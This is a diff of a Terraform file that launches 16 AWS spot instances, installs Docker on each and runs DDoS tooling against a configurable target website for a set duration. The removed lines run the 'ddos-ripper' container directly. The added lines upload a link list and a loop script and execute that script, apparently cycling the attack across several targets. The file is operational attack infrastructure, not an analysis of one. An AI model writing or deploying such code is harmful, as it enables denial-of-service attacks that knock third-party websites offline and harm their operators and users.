@@ -17,7 +17,7 @@ provider "aws" {
 resource "aws_spot_instance_request" "app_server" {
   ami                    = "ami-02333d201cff78886"
   count                  = 16
-  instance_type          = "t3.small"
+  instance_type          = "t3.medium"
   spot_price             = 0.1
   wait_for_fulfillment   = true
   spot_type              = "one-time"
@@ -28,16 +28,22 @@ resource "aws_spot_instance_request" "app_server" {
     Name = "Terraform-${count.index + 1}"
   }
 
+  provisioner "file" {
+    source      = "links.txt"
+    destination = "/tmp/links.txt"
+  }
+  provisioner "file" {
+    source      = "loop.sh"
+    destination = "/tmp/loop.sh"
+  }
   provisioner "remote-exec" {
     inline = [
       "sudo yum -y update",
       "sudo yum search docker",
       "sudo yum -y install docker",
       "sudo systemctl start docker.service",
-      "echo \"sudo docker stop -t ${var.attack_duration} \\$(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack})\" > ~/log ",
-      "sudo docker stop -t ${var.attack_duration} $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack}) &",
-      "sudo docker stop -t ${var.attack_duration} $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack}) &",
-      "sudo docker stop -t ${var.attack_duration} $(sudo docker run -d -it --stop-signal 2 nitupkcuf/ddos-ripper:latest ${var.website_to_attack})"
+      "sudo chmod +x /tmp/loop.sh",
+      "sudo bash /tmp/loop.sh ${var.attack_duration}"
     ]
   }
 
